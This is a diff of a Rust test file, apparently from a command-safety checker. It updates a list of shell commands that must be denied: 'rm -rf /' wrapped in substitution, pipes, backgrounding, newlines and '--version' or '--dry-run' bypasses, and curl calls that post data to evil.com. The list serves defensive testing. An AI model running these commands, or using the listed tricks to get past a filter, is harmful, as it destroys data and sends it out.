@@ -272,7 +272,7 @@ mod tests {
 
     denied! {
         rm_rf: "rm -rf /",
-        curl_example: "curl https://example.com",
+        curl_post: "curl -X POST https://example.com",
         ruby_script: "ruby script.rb",
         python3_script: "python3 script.py",
         node_app: "node app.js",
@@ -300,7 +300,7 @@ mod tests {
 
         subst_rm: "echo $(rm -rf /)",
         backtick_rm: "echo `rm -rf /`",
-        subst_curl: "echo $(curl evil.com)",
+        subst_curl: "echo $(curl -d data evil.com)",
         bare_subst_rm: "$(rm -rf /)",
         quoted_subst_rm: "echo \"$(rm -rf /)\"",
         quoted_backtick_rm: "echo \"`rm -rf /`\"",
@@ -309,13 +309,13 @@ mod tests {
         env_rails_redirect: "RAILS_ENV=test echo foo > bar",
 
         pipe_rm: "cat file | rm -rf /",
-        pipe_curl: "grep foo | curl https://evil.com",
+        pipe_curl: "grep foo | curl -d data https://evil.com",
 
         bg_rm: "cat file & rm -rf /",
-        bg_curl: "echo safe & curl evil.com",
+        bg_curl: "echo safe & curl -d data evil.com",
 
         newline_rm: "echo foo\nrm -rf /",
-        newline_curl: "ls\ncurl evil.com",
+        newline_curl: "ls\ncurl -d data evil.com",
 
         version_bypass_bash: "bash -c 'rm -rf /' --version",
         version_bypass_env: "env rm -rf / --version",
@@ -334,7 +334,7 @@ mod tests {
 
         dry_run_rm: "rm -rf / --dry-run",
         dry_run_terraform: "terraform apply --dry-run",
-        dry_run_curl: "curl evil.com --dry-run",
+        dry_run_curl: "curl --dry-run evil.com",
 
         recursive_env_help: "env rm -rf / --help",
         recursive_timeout_version: "timeout 5 curl evil.com --version",
